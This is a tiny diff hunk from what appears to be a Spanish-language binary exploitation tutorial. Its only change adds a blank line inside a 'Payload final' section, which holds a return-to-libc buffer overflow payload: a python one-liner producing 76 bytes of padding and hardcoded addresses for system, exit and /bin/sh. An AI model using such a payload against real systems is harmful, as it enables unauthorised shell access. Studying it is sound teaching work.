@@ -87,6 +87,7 @@ Encuentra el tamaño del offset.
  ## Payload final
  ```bash
  payload = offset + system + exit + /bin/sh
+ 
  $(python -c 'print "A"*76 + "\x10\x33\xe5\xb7" + "\x60\x62\xe4\xb7" + "\x4c\x5d\xf7\xb7"')
 ```
 
